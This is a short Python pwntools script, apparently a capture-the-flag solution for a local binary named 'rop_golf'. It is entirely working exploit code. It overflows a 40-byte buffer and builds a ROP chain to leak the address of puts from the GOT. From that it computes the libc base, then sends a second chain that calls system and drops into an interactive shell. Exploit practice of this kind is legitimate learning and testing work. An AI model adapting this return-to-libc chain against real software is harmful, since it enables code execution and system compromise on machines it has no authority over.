# coding: utf-8
from pwn import *
def ropgolf():
    vuln=0x00401142
    poprdi=0x4011fb
    p=process("./rop_golf")#,env = {'LD_LIBRARY_PATH' : '.'})
    elf=ELF("./rop_golf")
    callvuln=0x00401196
    payload=b"A"*40 + p64(poprdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(callvuln)
    p.send(payload)
    print(p.recvuntil("\n"))
    leak = p.recv()
    print(leak,leak[:-1])
    intleak = int.from_bytes(leak[:-1],"little")
    print(hex(intleak))
    gadd=elf.libc
    glibc=intleak-gadd.symbols["puts"]
    print(hex(glibc))
    gadd.address=glibc
    print(hex(gadd.sym["system"]))
    payload2=b"A"*40+p64(poprdi)+p64(glibc+0x001b45bd)+p64(gadd.sym["system"])
    p.send(payload2)
    #p.recv()
    p.interactive()
    #p.close()
    #print(p.recv())
    
